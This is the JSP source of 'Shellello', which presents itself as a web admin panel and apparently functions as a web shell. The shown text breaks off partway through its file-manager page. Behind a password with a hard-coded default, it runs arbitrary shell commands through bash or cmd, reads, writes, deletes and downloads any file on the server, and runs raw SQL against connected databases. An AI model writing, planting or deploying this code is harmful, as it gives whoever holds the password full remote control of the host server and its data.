<%--
    Shellello - Web Admin Panel
    JSP Edition v2.5.0
    
    Requirements:
    - Java 8+ (required for lambda expressions, Stream API)
    - Recommended: Java 11+ or Java 17 LTS
    - Tested: Java 8, 11, 17, 21
    - Servlet API 3.0+
    - JSP 2.2+
    
    Built: 2025-12-25
--%>
<%-- ========== 01_CONFIG ========== --%>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ page import="java.io.*" %>
<%@ page import="java.util.*" %>
<%@ page import="java.security.*" %>
<%@ page import="java.nio.file.*" %>
<%@ page import="java.text.*" %>
<%@ page import="java.sql.*" %>
<%!
    // ==========================================
    // CONFIGURATION
    // ==========================================
    static final String APP_NAME = "Shellello Admin";
    static final String APP_VERSION = "2.5.0";
    static final boolean DEBUG_MODE = false;
    
    // SHA-256 hash of your password
    // Default password: shikra
    static final String AUTH_HASH = "432d8194182647bfe08cae6592b190a7d35be2c9d302e25e4d070d404501d7fd";
%>

<%-- ========== 02_AUTH ========== --%>
<%!
    // ==========================================
    // AUTHENTICATION FUNCTIONS
    // ==========================================
    
    public static String sha256(String input) {
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] hash = md.digest(input.getBytes("UTF-8"));
            StringBuilder sb = new StringBuilder();
            for (byte b : hash) {
                sb.append(String.format("%02x", b));
            }
            return sb.toString();
        } catch (Exception e) {
            return "";
        }
    }
    
    public static boolean isAuthenticated(HttpSession sess) {
        Boolean auth = (Boolean) sess.getAttribute("authenticated");
        return auth != null && auth;
    }
    
    public static boolean attemptLogin(HttpSession sess, String password, String authHash) {
        if (sha256(password).equals(authHash)) {
            sess.setAttribute("authenticated", true);
            sess.setAttribute("login_time", System.currentTimeMillis());
            return true;
        }
        return false;
    }
    
    public static void logout(HttpSession sess) {
        sess.invalidate();
    }
%>

<%-- ========== 03_HELPERS ========== --%>
<%!
    // ==========================================
    // HELPER FUNCTIONS
    // ==========================================
    
    public static String formatBytes(long bytes) {
        String[] units = {"B", "KB", "MB", "GB", "TB"};
        int i = 0;
        double size = bytes;
        while (size >= 1024 && i < units.length - 1) {
            size /= 1024;
            i++;
        }
        return String.format("%.2f %s", size, units[i]);
    }
    
    public static String getSessionTime(HttpSession sess) {
        Long loginTime = (Long) sess.getAttribute("login_time");
        if (loginTime == null) return "0s";
        long diff = (System.currentTimeMillis() - loginTime) / 1000;
        long hours = diff / 3600;
        long mins = (diff % 3600) / 60;
        long secs = diff % 60;
        if (hours > 0) return hours + "h " + mins + "m";
        if (mins > 0) return mins + "m " + secs + "s";
        return secs + "s";
    }
    
    public static String escapeHtml(String text) {
        if (text == null) return "";
        return text.replace("&", "&amp;")
                   .replace("<", "&lt;")
                   .replace(">", "&gt;")
                   .replace("\"", "&quot;")
                   .replace("'", "&#39;");
    }
    
    public static String getClientIp(HttpServletRequest request) {
        String[] headers = {
            "X-Forwarded-For",
            "X-Real-IP",
            "Proxy-Client-IP",
            "WL-Proxy-Client-IP",
            "HTTP_CLIENT_IP",
            "HTTP_X_FORWARDED_FOR"
        };
        
        for (String header : headers) {
            String ip = request.getHeader(header);
            if (ip != null && !ip.isEmpty() && !"unknown".equalsIgnoreCase(ip)) {
                if (ip.contains(",")) {
                    ip = ip.split(",")[0].trim();
                }
                return ip;
            }
        }
        
        String remoteAddr = request.getRemoteAddr();
        return (remoteAddr != null && !remoteAddr.isEmpty()) ? remoteAddr : "Unknown";
    }
    
    public static void logError(String context, Exception e) {
        System.err.println("[" + new java.util.Date() + "] " + context + ": " + e.getMessage());
        if (DEBUG_MODE) {
            e.printStackTrace();
        }
    }
    
    public static String sanitizeError(Exception e) {
        if (DEBUG_MODE) return e.getMessage();
        if (e instanceof SQLException) return "Database operation failed";
        if (e.getMessage().contains("file") || e.getMessage().contains("directory")) {
            return "File operation failed";
        }
        return "Operation failed";
    }
    
    public static String escapeJs(String text) {
        if (text == null) return "";
        return text.replace("\\", "\\\\")
                   .replace("'", "\\'")
                   .replace("\"", "\\\"")
                   .replace("\n", "\\n")
                   .replace("\r", "\\r");
    }
    
    public static String executeCommand(String command) {
        StringBuilder output = new StringBuilder();
        try {
            ProcessBuilder pb = new ProcessBuilder();
            String os = System.getProperty("os.name").toLowerCase();
            if (os.contains("win")) {
                pb.command("cmd", "/c", command);
            } else {
                pb.command("bash", "-c", command);
            }
            pb.redirectErrorStream(true);
            Process process = pb.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            process.waitFor();
        } catch (Exception e) {
            output.append("Error: ").append(e.getMessage());
        }
        return output.toString();
    }
    
    public static List<Map<String, Object>> getFileList(String dirPath) {
        List<Map<String, Object>> files = new ArrayList<>();
        File dir = new File(dirPath);
        if (dir.exists() && dir.isDirectory()) {
            File[] fileList = dir.listFiles();
            if (fileList != null) {
                Arrays.sort(fileList, (a, b) -> {
                    if (a.isDirectory() && !b.isDirectory()) return -1;
                    if (!a.isDirectory() && b.isDirectory()) return 1;
                    return a.getName().compareToIgnoreCase(b.getName());
                });
                for (File f : fileList) {
                    Map<String, Object> fileInfo = new HashMap<>();
                    fileInfo.put("name", f.getName());
                    fileInfo.put("isDir", f.isDirectory());
                    fileInfo.put("size", f.length());
                    fileInfo.put("modified", f.lastModified());
                    fileInfo.put("readable", f.canRead());
                    fileInfo.put("writable", f.canWrite());
                    files.add(fileInfo);
                }
            }
        }
        return files;
    }
%>

<%-- ========== 04_API ========== --%>
<%!
    // ==========================================
    // API HANDLER
    // ==========================================
    
    public static void handleApiAction(String action, HttpServletRequest request, HttpServletResponse response, JspWriter out) throws Exception {
        response.setContentType("application/json");
        
        switch (action) {
            // File Operations
            case "list_files":
                handleListFiles(request, out);
                break;
            case "read_file":
                handleReadFile(request, out);
                break;
            case "save_file":
                handleSaveFile(request, out);
                break;
            case "delete_file":
                handleDeleteFile(request, out);
                break;
            case "create_folder":
                handleCreateFolder(request, out);
                break;
            case "rename":
                handleRename(request, out);
                break;
            case "download":
                handleDownload(request, response);
                break;
                
            // Terminal
            case "execute":
                handleExecute(request, out);
                break;
                
            // Database
            case "db_connect":
                handleDbConnect(request, out);
                break;
            case "db_query":
                handleDbQuery(request, out);
                break;
            case "db_export_csv":
                handleDbExportCsv(request, response, out);
                break;
            case "db_tables":
                handleDbTables(request, out);
                break;
                
            default:
                out.print("{\"status\":\"error\",\"message\":\"Unknown action\"}");
        }
    }
    
    private static void handleListFiles(HttpServletRequest request, JspWriter out) throws Exception {
        String path = request.getParameter("path");
        if (path == null || path.isEmpty()) path = System.getProperty("user.dir");
        
        File dir = new File(path);
        if (!dir.exists() || !dir.isDirectory()) {
            out.print("{\"status\":\"error\",\"message\":\"Directory not found\"}");
            return;
        }
        
        StringBuilder json = new StringBuilder();
        json.append("{\"status\":\"success\",\"path\":\"").append(escapeJs(dir.getAbsolutePath())).append("\",\"files\":[");
        
        File[] files = dir.listFiles();
        if (files != null) {
            Arrays.sort(files, (a, b) -> {
                if (a.isDirectory() && !b.isDirectory()) return -1;
                if (!a.isDirectory() && b.isDirectory()) return 1;
                return a.getName().compareToIgnoreCase(b.getName());
            });
            
            boolean first = true;
            for (File f : files) {
                if (!first) json.append(",");
                first = false;
                
                // Get file owner
                String owner = "unknown";
                try {
                    java.nio.file.attribute.UserPrincipal ownerPrincipal = 
                        java.nio.file.Files.getOwner(f.toPath());
                    owner = ownerPrincipal.getName();
                } catch (Exception e) {
                    // Fallback: owner stays "unknown"
                }
                
                json.append("{\"name\":\"").append(escapeJs(f.getName())).append("\"");
                json.append(",\"isDir\":").append(f.isDirectory());
                json.append(",\"size\":").append(f.length());
                json.append(",\"modified\":").append(f.lastModified());
                json.append(",\"owner\":\"").append(escapeJs(owner)).append("\"");
                json.append(",\"readable\":").append(f.canRead());
                json.append(",\"writable\":").append(f.canWrite()).append("}");
            }
        }
        json.append("]}");
        out.print(json.toString());
    }
    
    private static void handleReadFile(HttpServletRequest request, JspWriter out) throws Exception {
        String path = request.getParameter("path");
        File file = new File(path);
        
        if (!file.exists() || !file.canRead()) {
            out.print("{\"status\":\"error\",\"message\":\"Cannot read file\"}");
            return;
        }
        
        String content = new String(Files.readAllBytes(file.toPath()), "UTF-8");
        out.print("{\"status\":\"success\",\"content\":\"" + escapeJs(content) + "\"}");
    }
    
    private static void handleSaveFile(HttpServletRequest request, JspWriter out) throws Exception {
        String path = request.getParameter("path");
        String content = request.getParameter("content");
        
        try {
            Files.write(Paths.get(path), content.getBytes("UTF-8"));
            out.print("{\"status\":\"success\",\"message\":\"File saved\"}");
        } catch (Exception e) {
            out.print("{\"status\":\"error\",\"message\":\"" + escapeJs(e.getMessage()) + "\"}");
        }
    }
    
    private static void handleDeleteFile(HttpServletRequest request, JspWriter out) throws Exception {
        String path = request.getParameter("path");
        File file = new File(path);
        
        if (file.exists() && file.delete()) {
            out.print("{\"status\":\"success\",\"message\":\"Deleted\"}");
        } else {
            out.print("{\"status\":\"error\",\"message\":\"Cannot delete\"}");
        }
    }
    
    private static void handleCreateFolder(HttpServletRequest request, JspWriter out) throws Exception {
        String path = request.getParameter("path");
        File dir = new File(path);
        
        if (dir.mkdirs()) {
            out.print("{\"status\":\"success\",\"message\":\"Folder created\"}");
        } else {
            out.print("{\"status\":\"error\",\"message\":\"Cannot create folder\"}");
        }
    }
    
    private static void handleRename(HttpServletRequest request, JspWriter out) throws Exception {
        String oldPath = request.getParameter("old_path");
        String newPath = request.getParameter("new_path");
        File oldFile = new File(oldPath);
        File newFile = new File(newPath);
        
        if (oldFile.renameTo(newFile)) {
            out.print("{\"status\":\"success\",\"message\":\"Renamed\"}");
        } else {
            out.print("{\"status\":\"error\",\"message\":\"Cannot rename\"}");
        }
    }
    
    private static void handleDownload(HttpServletRequest request, HttpServletResponse response) throws Exception {
        String path = request.getParameter("path");
        File file = new File(path);
        
        if (file.exists() && file.canRead()) {
            response.setContentType("application/octet-stream");
            response.setHeader("Content-Disposition", "attachment; filename=\"" + file.getName() + "\"");
            Files.copy(file.toPath(), response.getOutputStream());
        }
    }
    
    private static void handleExecute(HttpServletRequest request, JspWriter out) throws Exception {
        String command = request.getParameter("command");
        String cwd = request.getParameter("cwd");
        
        StringBuilder output = new StringBuilder();
        try {
            ProcessBuilder pb = new ProcessBuilder();
            String os = System.getProperty("os.name").toLowerCase();
            if (os.contains("win")) {
                pb.command("cmd", "/c", command);
            } else {
                pb.command("bash", "-c", command);
            }
            if (cwd != null && !cwd.isEmpty()) {
                pb.directory(new File(cwd));
            }
            pb.redirectErrorStream(true);
            Process process = pb.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            process.waitFor();
            out.print("{\"status\":\"success\",\"output\":\"" + escapeJs(output.toString()) + "\"}");
        } catch (Exception e) {
            out.print("{\"status\":\"error\",\"message\":\"" + escapeJs(e.getMessage()) + "\"}");
        }
    }
    
    private static void handleDbConnect(HttpServletRequest request, JspWriter out) throws Exception {
        String dbType = request.getParameter("db_type");
        String host = request.getParameter("host");
        String port = request.getParameter("port");
        String dbName = request.getParameter("database");
        String user = request.getParameter("username");
        String pass = request.getParameter("password");
        
        try {
            String url = "";
            if ("mysql".equals(dbType)) {
                Class.forName("com.mysql.cj.jdbc.Driver");
                url = "jdbc:mysql://" + host + ":" + port + "/" + dbName;
            } else if ("postgresql".equals(dbType)) {
                Class.forName("org.postgresql.Driver");
                url = "jdbc:postgresql://" + host + ":" + port + "/" + dbName;
            }
            
            Connection conn = DriverManager.getConnection(url, user, pass);
            request.getSession().setAttribute("db_conn", conn);
            request.getSession().setAttribute("db_type", dbType);
            out.print("{\"status\":\"success\",\"message\":\"Connected to database\"}");
        } catch (Exception e) {
            out.print("{\"status\":\"error\",\"message\":\"" + escapeJs(e.getMessage()) + "\"}");
        }
    }
    
    private static void handleDbTables(HttpServletRequest request, JspWriter out) throws Exception {
        Connection conn = (Connection) request.getSession().getAttribute("db_conn");
        if (conn == null) {
            out.print("{\"status\":\"error\",\"message\":\"Not connected\"}");
            return;
        }
        
        try {
            DatabaseMetaData meta = conn.getMetaData();
            ResultSet rs = meta.getTables(null, null, "%", new String[]{"TABLE"});
            StringBuilder json = new StringBuilder();
            json.append("{\"status\":\"success\",\"tables\":[");
            boolean first = true;
            while (rs.next()) {
                if (!first) json.append(",");
                first = false;
                json.append("\"").append(escapeJs(rs.getString("TABLE_NAME"))).append("\"");
            }
            json.append("]}");
            out.print(json.toString());
        } catch (Exception e) {
            out.print("{\"status\":\"error\",\"message\":\"" + escapeJs(e.getMessage()) + "\"}");
        }
    }
    
    private static void handleDbQuery(HttpServletRequest request, JspWriter out) throws Exception {
        Connection conn = (Connection) request.getSession().getAttribute("db_conn");
        if (conn == null) {
            out.print("{\"status\":\"error\",\"message\":\"Not connected\"}");
            return;
        }
        
        String query = request.getParameter("query");
        try {
            Statement stmt = conn.createStatement();
            boolean isResultSet = stmt.execute(query);
            
            if (isResultSet) {
                ResultSet rs = stmt.getResultSet();
                ResultSetMetaData meta = rs.getMetaData();
                int cols = meta.getColumnCount();
                
                StringBuilder json = new StringBuilder();
                json.append("{\"status\":\"success\",\"columns\":[");
                for (int i = 1; i <= cols; i++) {
                    if (i > 1) json.append(",");
                    json.append("\"").append(escapeJs(meta.getColumnName(i))).append("\"");
                }
                json.append("],\"rows\":[");
                
                boolean firstRow = true;
                while (rs.next()) {
                    if (!firstRow) json.append(",");
                    firstRow = false;
                    json.append("[");
                    for (int i = 1; i <= cols; i++) {
                        if (i > 1) json.append(",");
                        String val = rs.getString(i);
                        json.append(val == null ? "null" : "\"" + escapeJs(val) + "\"");
                    }
                    json.append("]");
                }
                json.append("]}");
                out.print(json.toString());
            } else {
                int affected = stmt.getUpdateCount();
                out.print("{\"status\":\"success\",\"affected\":" + affected + ",\"message\":\"Query executed\"}");
            }
        } catch (Exception e) {
            out.print("{\"status\":\"error\",\"message\":\"" + escapeJs(e.getMessage()) + "\"}");
        }
    }
    
    private static void handleDbExportCsv(HttpServletRequest request, HttpServletResponse response, JspWriter out) throws Exception {
        Connection conn = (Connection) request.getSession().getAttribute("db_conn");
        if (conn == null) {
            out.print("{\"status\":\"error\",\"message\":\"Not connected\"}");
            return;
        }
        
        String query = request.getParameter("query");
        try {
            Statement stmt = conn.createStatement();
            ResultSet rs = stmt.executeQuery(query);
            ResultSetMetaData meta = rs.getMetaData();
            int cols = meta.getColumnCount();
            
            // Set CSV headers
            response.setContentType("text/csv; charset=utf-8");
            response.setHeader("Content-Disposition", "attachment; filename=export_" + 
                new java.text.SimpleDateFormat("yyyy-MM-dd_HHmmss").format(new java.util.Date()) + ".csv");
            
            java.io.PrintWriter csvOut = response.getWriter();
            
            // Write header row
            for (int i = 1; i <= cols; i++) {
                if (i > 1) csvOut.print(",");
                csvOut.print(escapeCsv(meta.getColumnName(i)));
            }
            csvOut.println();
            
            // Write data rows
            while (rs.next()) {
                for (int i = 1; i <= cols; i++) {
                    if (i > 1) csvOut.print(",");
                    String val = rs.getString(i);
                    csvOut.print(val != null ? escapeCsv(val) : "");
                }
                csvOut.println();
            }
            csvOut.flush();
        } catch (Exception e) {
            out.print("{\"status\":\"error\",\"message\":\"" + escapeJs(e.getMessage()) + "\"}");
        }
    }
    
    private static String escapeCsv(String s) {
        if (s == null) return "";
        if (s.contains(",") || s.contains("\"") || s.contains("\n")) {
            return "\"" + s.replace("\"", "\"\"") + "\"";
        }
        return s;
    }
%>

<%-- ========== 05_LOGIN ========== --%>
<%!
    // ==========================================
    // LOGIN PAGE RENDERER
    // ==========================================
    
    public static String renderLoginPage(String error, String appName) {
        StringBuilder html = new StringBuilder();
        html.append("<!DOCTYPE html>\n");
        html.append("<html lang=\"en\">\n");
        html.append("<head>\n");
        html.append("    <meta charset=\"UTF-8\">\n");
        html.append("    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n");
        html.append("    <title>").append(appName).append(" - Login</title>\n");
        html.append("    <style>\n");
        html.append("        * { margin: 0; padding: 0; box-sizing: border-box; }\n");
        html.append("        body {\n");
        html.append("            font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto, sans-serif;\n");
        html.append("            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);\n");
        html.append("            min-height: 100vh;\n");
        html.append("            display: flex;\n");
        html.append("            align-items: center;\n");
        html.append("            justify-content: center;\n");
        html.append("        }\n");
        html.append("        .login-container {\n");
        html.append("            background: rgba(255,255,255,0.05);\n");
        html.append("            backdrop-filter: blur(10px);\n");
        html.append("            border: 1px solid rgba(255,255,255,0.1);\n");
        html.append("            border-radius: 16px;\n");
        html.append("            padding: 40px;\n");
        html.append("            width: 100%;\n");
        html.append("            max-width: 400px;\n");
        html.append("            box-shadow: 0 25px 50px rgba(0,0,0,0.3);\n");
        html.append("        }\n");
        html.append("        .login-header {\n");
        html.append("            text-align: center;\n");
        html.append("            margin-bottom: 30px;\n");
        html.append("        }\n");
        html.append("        .login-header h1 {\n");
        html.append("            color: #fff;\n");
        html.append("            font-size: 28px;\n");
        html.append("            font-weight: 600;\n");
        html.append("        }\n");
        html.append("        .login-header p {\n");
        html.append("            color: rgba(255,255,255,0.6);\n");
        html.append("            margin-top: 8px;\n");
        html.append("        }\n");
        html.append("        .form-group { margin-bottom: 20px; }\n");
        html.append("        .form-group label {\n");
        html.append("            display: block;\n");
        html.append("            color: rgba(255,255,255,0.8);\n");
        html.append("            margin-bottom: 8px;\n");
        html.append("            font-size: 14px;\n");
        html.append("        }\n");
        html.append("        .form-group input {\n");
        html.append("            width: 100%;\n");
        html.append("            padding: 14px 16px;\n");
        html.append("            background: rgba(255,255,255,0.1);\n");
        html.append("            border: 1px solid rgba(255,255,255,0.2);\n");
        html.append("            border-radius: 8px;\n");
        html.append("            color: #fff;\n");
        html.append("            font-size: 16px;\n");
        html.append("            transition: all 0.3s;\n");
        html.append("        }\n");
        html.append("        .form-group input:focus {\n");
        html.append("            outline: none;\n");
        html.append("            border-color: #4f46e5;\n");
        html.append("            background: rgba(255,255,255,0.15);\n");
        html.append("        }\n");
        html.append("        .btn-login {\n");
        html.append("            width: 100%;\n");
        html.append("            padding: 14px;\n");
        html.append("            background: linear-gradient(135deg, #4f46e5, #7c3aed);\n");
        html.append("            border: none;\n");
        html.append("            border-radius: 8px;\n");
        html.append("            color: #fff;\n");
        html.append("            font-size: 16px;\n");
        html.append("            font-weight: 600;\n");
        html.append("            cursor: pointer;\n");
        html.append("            transition: transform 0.2s, box-shadow 0.2s;\n");
        html.append("        }\n");
        html.append("        .btn-login:hover {\n");
        html.append("            transform: translateY(-2px);\n");
        html.append("            box-shadow: 0 10px 20px rgba(79,70,229,0.3);\n");
        html.append("        }\n");
        html.append("        .error {\n");
        html.append("            background: rgba(239,68,68,0.2);\n");
        html.append("            border: 1px solid rgba(239,68,68,0.5);\n");
        html.append("            color: #fca5a5;\n");
        html.append("            padding: 12px;\n");
        html.append("            border-radius: 8px;\n");
        html.append("            margin-bottom: 20px;\n");
        html.append("            text-align: center;\n");
        html.append("        }\n");
        html.append("    </style>\n");
        html.append("</head>\n");
        html.append("<body>\n");
        html.append("    <div class=\"login-container\">\n");
        html.append("        <div class=\"login-header\">\n");
        html.append("            <h1>🐚 ").append(appName).append("</h1>\n");
        html.append("            <p>JSP Edition</p>\n");
        html.append("        </div>\n");
        
        if (error != null && !error.isEmpty()) {
            html.append("        <div class=\"error\">").append(escapeHtml(error)).append("</div>\n");
        }
        
        html.append("        <form method=\"POST\">\n");
        html.append("            <div class=\"form-group\">\n");
        html.append("                <label for=\"password\">Password</label>\n");
        html.append("                <input type=\"password\" id=\"password\" name=\"password\" placeholder=\"Enter your password\" required autofocus>\n");
        html.append("            </div>\n");
        html.append("            <button type=\"submit\" class=\"btn-login\">Login</button>\n");
        html.append("        </form>\n");
        html.append("    </div>\n");
        html.append("</body>\n");
        html.append("</html>\n");
        
        return html.toString();
    }
%>

<%-- ========== 06_LAYOUT ========== --%>
<%!
    // ==========================================
    // LAYOUT RENDERER
    // ==========================================
    
    public static String renderLayoutStart(String page, String appName, String appVersion, HttpSession sess) {
        StringBuilder html = new StringBuilder();
        html.append("<!DOCTYPE html>\n");
        html.append("<html lang=\"en\">\n");
        html.append("<head>\n");
        html.append("    <meta charset=\"UTF-8\">\n");
        html.append("    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n");
        html.append("    <title>").append(appName).append("</title>\n");
        html.append("    <style>\n");
        html.append("        * { margin: 0; padding: 0; box-sizing: border-box; }\n");
        html.append("        body { font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto, sans-serif; background: #0f172a; color: #e2e8f0; display: flex; min-height: 100vh; }\n");
        html.append("        .sidebar { width: 260px; background: #1e293b; border-right: 1px solid #334155; padding: 20px 0; display: flex; flex-direction: column; }\n");
        html.append("        .sidebar-header { padding: 0 20px 20px; border-bottom: 1px solid #334155; }\n");
        html.append("        .sidebar-header h1 { font-size: 20px; color: #fff; }\n");
        html.append("        .sidebar-header span { font-size: 12px; color: #64748b; }\n");
        html.append("        .nav { flex: 1; padding: 20px 0; }\n");
        html.append("        .nav a { display: flex; align-items: center; padding: 12px 20px; color: #94a3b8; text-decoration: none; transition: all 0.2s; gap: 12px; }\n");
        html.append("        .nav a:hover { background: #334155; color: #fff; }\n");
        html.append("        .nav a.active { background: linear-gradient(90deg, #4f46e5, transparent); color: #fff; border-left: 3px solid #4f46e5; }\n");
        html.append("        .nav-icon { font-size: 18px; }\n");
        html.append("        .main { flex: 1; display: flex; flex-direction: column; }\n");
        html.append("        .header { background: #1e293b; padding: 16px 24px; border-bottom: 1px solid #334155; display: flex; justify-content: space-between; align-items: center; }\n");
        html.append("        .header h2 { font-size: 18px; font-weight: 600; }\n");
        html.append("        .header-actions { display: flex; gap: 12px; align-items: center; }\n");
        html.append("        .session-time { color: #64748b; font-size: 14px; }\n");
        html.append("        .btn-logout { background: #dc2626; color: #fff; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; font-size: 14px; text-decoration: none; }\n");
        html.append("        .btn-logout:hover { background: #b91c1c; }\n");
        html.append("        .content { flex: 1; padding: 24px; overflow-y: auto; }\n");
        html.append("        .card { background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 20px; margin-bottom: 20px; }\n");
        html.append("        .card-header { font-size: 16px; font-weight: 600; margin-bottom: 16px; color: #fff; }\n");
        html.append("        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; }\n");
        html.append("        .stat-card { background: linear-gradient(135deg, #1e293b, #334155); border: 1px solid #475569; border-radius: 12px; padding: 20px; }\n");
        html.append("        .stat-label { color: #94a3b8; font-size: 14px; margin-bottom: 8px; }\n");
        html.append("        .stat-value { color: #fff; font-size: 24px; font-weight: 600; }\n");
        html.append("        .btn { padding: 10px 20px; border: none; border-radius: 6px; cursor: pointer; font-size: 14px; transition: all 0.2s; }\n");
        html.append("        .btn-primary { background: #4f46e5; color: #fff; }\n");
        html.append("        .btn-primary:hover { background: #4338ca; }\n");
        html.append("        .btn-secondary { background: #475569; color: #fff; }\n");
        html.append("        .btn-secondary:hover { background: #64748b; }\n");
        html.append("        .btn-danger { background: #dc2626; color: #fff; }\n");
        html.append("        .btn-danger:hover { background: #b91c1c; }\n");
        html.append("        input, textarea, select { background: #0f172a; border: 1px solid #334155; color: #e2e8f0; padding: 10px 14px; border-radius: 6px; font-size: 14px; }\n");
        html.append("        input:focus, textarea:focus, select:focus { outline: none; border-color: #4f46e5; }\n");
        html.append("        table { width: 100%; border-collapse: collapse; }\n");
        html.append("        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #334155; }\n");
        html.append("        th { background: #0f172a; color: #94a3b8; font-weight: 500; }\n");
        html.append("        tr:hover { background: rgba(255,255,255,0.02); }\n");
        html.append("        .toast { position: fixed; bottom: 20px; right: 20px; padding: 14px 20px; border-radius: 8px; color: #fff; z-index: 9999; animation: slideIn 0.3s; }\n");
        html.append("        .toast-success { background: #059669; }\n");
        html.append("        .toast-error { background: #dc2626; }\n");
        html.append("        @keyframes slideIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }\n");
        html.append("    </style>\n");
        html.append("</head>\n");
        html.append("<body>\n");
        html.append("    <div class=\"sidebar\">\n");
        html.append("        <div class=\"sidebar-header\">\n");
        html.append("            <h1>").append(appName).append("</h1>\n");
        html.append("            <span>v").append(appVersion).append(" - JSP</span>\n");
        html.append("        </div>\n");
        html.append("        <nav class=\"nav\">\n");
        html.append("            <a href=\"?page=dashboard\" class=\"").append("dashboard".equals(page) ? "active" : "").append("\"><span class=\"nav-icon\">📊</span> Dashboard</a>\n");
        html.append("            <a href=\"?page=files\" class=\"").append("files".equals(page) ? "active" : "").append("\"><span class=\"nav-icon\">📁</span> File Manager</a>\n");
        html.append("            <a href=\"?page=database\" class=\"").append("database".equals(page) ? "active" : "").append("\"><span class=\"nav-icon\">🗄️</span> Database</a>\n");
        html.append("            <a href=\"?page=terminal\" class=\"").append("terminal".equals(page) ? "active" : "").append("\"><span class=\"nav-icon\">💻</span> Terminal</a>\n");
        html.append("            <a href=\"?page=settings\" class=\"").append("settings".equals(page) ? "active" : "").append("\"><span class=\"nav-icon\">⚙️</span> Settings</a>\n");
        html.append("        </nav>\n");
        html.append("    </div>\n");
        html.append("    <div class=\"main\">\n");
        html.append("        <div class=\"header\">\n");
        html.append("            <h2>").append(getPageTitle(page)).append("</h2>\n");
        html.append("            <div class=\"header-actions\">\n");
        html.append("                <span class=\"session-time\">Session: ").append(getSessionTime(sess)).append("</span>\n");
        html.append("                <a href=\"?logout=1\" class=\"btn-logout\">Logout</a>\n");
        html.append("            </div>\n");
        html.append("        </div>\n");
        html.append("        <div class=\"content\">\n");
        
        return html.toString();
    }
    
    public static String renderLayoutEnd() {
        return "        </div>\n    </div>\n</body>\n</html>\n";
    }
    
    private static String getPageTitle(String page) {
        switch (page) {
            case "files": return "File Manager";
            case "database": return "Database Manager";
            case "terminal": return "Terminal";
            case "settings": return "Settings";
            default: return "Dashboard";
        }
    }
%>

<%-- ========== 07_DASHBOARD ========== --%>
<%!
    // ==========================================
    // DASHBOARD PAGE
    // ==========================================
    
    public static String renderDashboardContent(HttpSession sess) {
        Runtime runtime = Runtime.getRuntime();
        long totalMem = runtime.totalMemory();
        long freeMem = runtime.freeMemory();
        long usedMem = totalMem - freeMem;
        
        File root = new File("/");
        long totalDisk = root.getTotalSpace();
        long freeDisk = root.getFreeSpace();
        long usedDisk = totalDisk - freeDisk;
        
        StringBuilder html = new StringBuilder();
        html.append("<div class=\"grid\">\n");
        
        // Server Info
        html.append("    <div class=\"stat-card\">\n");
        html.append("        <div class=\"stat-label\">🖥️ Server</div>\n");
        html.append("        <div class=\"stat-value\" style=\"font-size:16px;\">").append(escapeHtml(System.getProperty("os.name"))).append("</div>\n");
        html.append("    </div>\n");
        
        // Java Version
        html.append("    <div class=\"stat-card\">\n");
        html.append("        <div class=\"stat-label\">☕ Java Version</div>\n");
        html.append("        <div class=\"stat-value\" style=\"font-size:16px;\">").append(escapeHtml(System.getProperty("java.version"))).append("</div>\n");
        html.append("    </div>\n");
        
        // Memory
        html.append("    <div class=\"stat-card\">\n");
        html.append("        <div class=\"stat-label\">💾 Memory Used</div>\n");
        html.append("        <div class=\"stat-value\">").append(formatBytes(usedMem)).append("</div>\n");
        html.append("    </div>\n");
        
        // Disk
        html.append("    <div class=\"stat-card\">\n");
        html.append("        <div class=\"stat-label\">💿 Disk Free</div>\n");
        html.append("        <div class=\"stat-value\">").append(formatBytes(freeDisk)).append("</div>\n");
        html.append("    </div>\n");
        
        // Current Dir
        html.append("    <div class=\"stat-card\">\n");
        html.append("        <div class=\"stat-label\">📂 Working Directory</div>\n");
        html.append("        <div class=\"stat-value\" style=\"font-size:14px;word-break:break-all;\">").append(escapeHtml(System.getProperty("user.dir"))).append("</div>\n");
        html.append("    </div>\n");
        
        // User
        html.append("    <div class=\"stat-card\">\n");
        html.append("        <div class=\"stat-label\">👤 Current User</div>\n");
        html.append("        <div class=\"stat-value\">").append(escapeHtml(System.getProperty("user.name"))).append("</div>\n");
        html.append("    </div>\n");
        
        html.append("</div>\n");
        
        // Quick Actions
        html.append("<div class=\"card\" style=\"margin-top:20px;\">\n");
        html.append("    <div class=\"card-header\">Quick Actions</div>\n");
        html.append("    <div style=\"display:flex;gap:12px;flex-wrap:wrap;\">\n");
        html.append("        <a href=\"?page=files\" class=\"btn btn-primary\" style=\"text-decoration:none;\">📁 Browse Files</a>\n");
        html.append("        <a href=\"?page=terminal\" class=\"btn btn-secondary\" style=\"text-decoration:none;\">💻 Open Terminal</a>\n");
        html.append("        <a href=\"?page=database\" class=\"btn btn-secondary\" style=\"text-decoration:none;\">🗄️ Database</a>\n");
        html.append("    </div>\n");
        html.append("</div>\n");
        
        return html.toString();
    }
%>

<%-- ========== 08_FILES ========== --%>
<%!
    // ==========================================
    // FILE MANAGER PAGE
    // ==========================================
    
    public static String renderFileManagerContent() {
        String cwd = System.getProperty("user.dir");
        
        StringBuilder html = new StringBuilder();
        
        // Toolbar
        html.append("<div class=\"card\">\n");
        html.append("    <div style=\"display:flex;gap:12px;align-items:center;flex-wrap:wrap;\">\n");
        html.append("        <input type=\"text\" id=\"currentPath\" value=\"").append(escapeHtml(cwd)).append("\" style=\"flex:1;min-width:200px;\">\n");
        html.append("        <button class=\"btn btn-primary\" onclick=\"loadFiles()\">Go</button>\n");
        html.append("        <button class=\"btn btn-secondary\" onclick=\"goUp()\">⬆️ Up</button>\n");
